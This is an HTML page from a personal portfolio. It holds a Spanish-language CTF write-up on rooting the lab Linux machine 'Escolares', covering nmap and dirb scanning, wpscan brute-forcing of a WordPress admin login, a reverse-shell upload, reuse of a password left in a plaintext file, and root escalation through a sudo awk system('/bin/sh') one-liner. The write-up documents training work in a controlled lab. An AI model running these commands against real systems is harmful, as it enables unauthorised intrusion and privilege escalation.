@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Paradis</title>
+  <link href="../style/estilo.css" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <link rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+
+<body class="bg-gray-900 text-white">
+
+    <nav class="bg-gray-800 text-white sticky top-0 z-50 shadow-md">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="flex justify-between items-center h-16">
+            <div class="flex-shrink-0">
+            <h1>Santiago Lorenzo</h1>
+            </div>
+            <div class="hidden md:flex space-x-4">
+            <a href="../index.html#inicio" class="hover:text-blue-400 transition">Inicio</a>
+            <a href="../index.html#certificados" class="hover:text-blue-400 transition">Certificaciones</a>
+            <a href="../index.html#proyectos" class="hover:text-blue-400 transition">Proyectos</a>
+            <a href="../writeups.html" class="hover:text-blue-400 transition">Write-ups</a>
+            </div>
+        </div>
+        </div>
+    </nav>
+
+    <main class="max-w-4xl mx-auto px-6 py-12">
+
+    <h1 class="text-4xl font-bold mb-2">🔹Maquina: Escolares</h1>
+    <p class="text-gray-400 text-sm mb-8">📅 Publicado el 18/08/2025 | Categoría: LINUX </p>
+
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">📝 Descripción</h2>
+        <p class="text-gray-300 leading-relaxed">
+            Este reto consiste en comprometer una máquina Linux en un entorno controlado. No se proporciona una flag directa,
+            pero el objetivo es obtener acceso privilegiado (root) y entender el vector de escalada.
+        </p>
+    </section>
+
+    <!----------------- Análisis ----------------------->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🔍 Análisis inicial</h2>
+        <p class="text-gray-300 mb-4">
+            El análisis comenzó con un reconocimiento básico utilizando herramientas de enumeración para comprender los servicios expuestos.
+        </p>
+        <pre><code class="language-bash">
+            sudo nmap -p- -open -O -sS -sC -min-rate 5000 -n -Pn 172.17.0.2
+            
+            PORT   STATE SERVICE
+                22/tcp open  ssh
+                | ssh-hostkey: 
+                |   256 42:24:24:f5:66:68:a4:ad:8e:24:0d:70:4a:a5:e3:4f (ECDSA)
+                |_  256 29:42:2e:b6:85:ae:fb:09:89:8d:b9:c1:dc:4d:fc:1e (ED25519)
+                80/tcp open  http
+                |_http-title: P\xC3\xA1gina Escolar Universitaria
+        </code></pre>
+
+        <p class="text-gray-300 mb-4">
+            al ver el purto 80 abirto entramos en la web y hacemos reconocimiento de los directorios, 
+            entre los muchos que hay nos importa este:
+        </p>
+
+        <pre><code class="language-bash">
+            sudo dirb http://172.17.0.2/
+
+            ==> DIRECTORY: http://172.17.0.2/wordpress/wp-admin/ 
+        </code></pre>
+
+        <p class="text-gray-300 mb-4">
+            Entonces observando la pagina en la seccion de profesores, vemos que hay un profe que es el admin,
+            con sus datos creamos un diccionario personalizado con cupp, lo siguiente es 
+            realizar fuerza bruta sobre el panel de login, yo por probar el panel de wp 
+            me di cuenta que el usuario era luisillo, pero la contraseña si la tuve que 
+            encontrar con fuerza bruta:
+        </p>
+
+        <pre><code class="language-bash">
+            wpscan --url http://172.17.0.2/wordpress/ -U luisillo -P luis.txt --password-attack wp-login
+
+            Valid Combinations Found:
+            Username: luisillo, Password: Luis1981
+
+        </code></pre>
+
+        <p class="text-gray-300 mb-4">
+            Teniendo acceso a el panel de wordpres como admin subimos un archivo que nos devuelve una shell
+            creado con "https://www.revshells.com/", nos ponemos a la escucha y ya tenemos la reverse shell
+        </p>
+
+        <pre><code class="language-bash">
+            www-data@5e73f6b95669:/$ ls
+            ls
+            bin
+            bin.usr-is-merged
+            boot
+            dev
+            etc
+            home
+            lib
+            lib.usr-is-merged
+            lib64
+            media
+            mnt
+            opt
+            proc
+            root
+            run
+            sbin
+            sbin.usr-is-merged
+            srv
+            sys
+            tmp
+            usr
+            var
+        </code></pre>
+
+        
+        <p class="text-gray-300 mb-4">
+            El pivoteo se realizo de la suiguiente manera:
+        </p>
+
+        <pre><code class="language-bash">
+            www-data@5e73f6b95669:/$ cd /home
+            cd /home
+            www-data@5e73f6b95669:/home$ ls
+            ls
+                luisillo
+                secret.txt
+                ubuntu
+            www-data@5e73f6b95669:/home$ cat secret.txt
+            cat secret.txt
+                luisillopasswordsecret
+            www-data@5e73f6b95669:/home$ su luisillo
+            su luisillo
+            Password: luisillopasswordsecret
+            whoami
+            luisillo
+        </code></pre>
+
+
+    <!-- Explotación / Resolución -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">💣 Escalada de privilegios / Resolución</h2>
+        <p class="text-gray-300 mb-4">
+            El usuario luisillo tenía permisos de sudo para ejecutar /usr/bin/awk sin contraseña:
+        </p>
+
+        <pre><code class="language-bash">
+            sudo -l
+            Matching Defaults entries for luisillo on 5e73f6b95669:
+                env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+            User luisillo may run the following commands on 5e73f6b95669:
+                (ALL) NOPASSWD: /usr/bin/awk
+        </code></pre>
+
+        <p class="text-gray-300 mb-4">
+            Como awk permite ejecutar comandos del sistema mediante system(), se abusó de esto con:
+        </p>
+        <pre><code class="language-bash"></code>
+            sudo awk 'BEGIN {system("/bin/sh")}'
+        </code></pre>
+        <p class="text-gray-300 mb-4">
+            Esto abrió una shell como root. Al verificar con whoami, se confirmó la escalada de privilegios.
+        </p>
+
+        <pre><code class="language-bash"></code>
+            whoami
+                root
+        </code></pre>
+    </section>
+
+    <!-- Resultado final -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🏆 Resultado</h2>
+        <p class="text-gray-300">
+            Conseguimos acceso como <code>root</code>.
+        </p>
+    </section>
+
+    <div class="mt-10">
+        <a href="../writeup.html"
+            class="inline-block bg-blue-500 px-6 py-2 rounded-lg text-white hover:bg-blue-700 transition">
+            ← Volver a la lista de Write-ups
+        </a>
+    </div>
+
+    </main>
+
+</body>
+</html>
